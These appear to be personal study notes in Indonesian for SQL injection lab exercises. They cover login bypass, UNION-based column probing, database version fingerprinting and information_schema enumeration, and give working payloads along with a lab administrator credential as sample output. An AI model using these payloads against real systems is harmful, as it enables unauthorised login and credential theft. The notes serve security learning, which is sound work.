## 1. Basic SQL Injection

### Query Given:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### End Goal:
Menampilkan semua produk, baik yang telah dirilis maupun yang belum.

### Fuzzing dengan Payload Manual:
```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1;
SELECT * FROM products WHERE category = ''' AND released = 1;
SELECT * FROM products WHERE category = ''--' AND released = 1;
SELECT * FROM products WHERE category = '';
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1;
```

### Library Python yang Digunakan:
- `requests`
- `sys` (untuk mengambil argumen dari CLI)

---

## 2. Vulnerability Allowing Login Bypass

### Asumsi Query SQL untuk Autentikasi:
```sql
SELECT * FROM USERS WHERE username = "input" AND password == "input"
```

### Fuzzing Hingga Query Berubah:
```sql
SELECT * FROM USERS WHERE username = "' OR 1=1 -- " AND password == "input"
```

### Library Python yang Digunakan:
- `BeautifulSoup` (untuk mendapatkan CSRF token dari HTML)

---

## 3. SQLi UNION Attack: Menentukan Jumlah Kolom & Menemukan Kolom Tipe Teks

### End Goal:
Menentukan jumlah kolom yang dikembalikan oleh query.

### Contoh UNION Query:
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
```

### Rules:
- Jumlah dan urutan kolom harus sama.
- Tipe data harus kompatibel.

### Menentukan Jumlah Kolom:
```sql
SELECT ? FROM table1 UNION SELECT NULL, NULL;  -- error (jumlah kolom salah)
SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL;  -- sukses (jumlah kolom benar)
```

### Menentukan Tipe Data Kolom:
```sql
SELECT a, b, c FROM table1 UNION SELECT NULL, NULL, 'a';
```
Jika tidak ada error, berarti kolom `c` bertipe string.

---

## 4. UNION Attack: Mengambil Data dari Tabel Lain

### End Goal:
Menampilkan username dan password dari tabel `users` dan login sebagai administrator.

### Langkah-Langkah:
1. Menentukan jumlah kolom:
   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3-- (error)
   ```
   → Jumlah kolom = 2

2. Menentukan tipe data kolom:
   ```sql
   ' UNION SELECT NULL, 'a'--
   ' UNION SELECT 'a', 'a'-- (error)
   ```
   → Salah satu kolom bertipe string.

3. Payload untuk mendapatkan kredensial:
   ```sql
   ' UNION SELECT NULL, username || '~' || password FROM users--
   ```
   **Output:** `administrator~zow0ture2abq8dc3062m`

---

## 5. SQL Injection: Mengetahui Tipe dan Versi Database (MySQL & Microsoft SQL)

### Langkah-Langkah:
4. Intercept request menggunakan **Burp Suite**.
5. Menentukan jumlah dan tipe data kolom:
   ```sql
   '+UNION+SELECT+'abc','def'#
   ```
6. Menampilkan versi database:
   ```sql
   '+UNION+SELECT+@@version,+NULL#
   ```

---

## 6. SQL Injection: Menampilkan Isi Database pada Non-Oracle

### Langkah-Langkah:
7. Intercept request menggunakan **Burp Suite**.
8. Menentukan jumlah dan tipe data kolom:
   ```sql
   '+UNION+SELECT+'abc','def'--
   ```
9. Menampilkan daftar tabel dalam database:
   ```sql
   '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
   ```
10. Menentukan tabel yang menyimpan kredensial pengguna.
11. Menampilkan daftar kolom dalam tabel pengguna:
   ```sql
   '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
   ```
12. Menemukan nama kolom untuk username dan password.
13. Mendapatkan kredensial pengguna:
   ```sql
   '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
   ```
14. Menemukan password admin dan menggunakannya untuk login.

---

## 7. Blind SQL Injection

**(Belum ada detail, bisa dikembangkan lebih lanjut)**


users_aeycka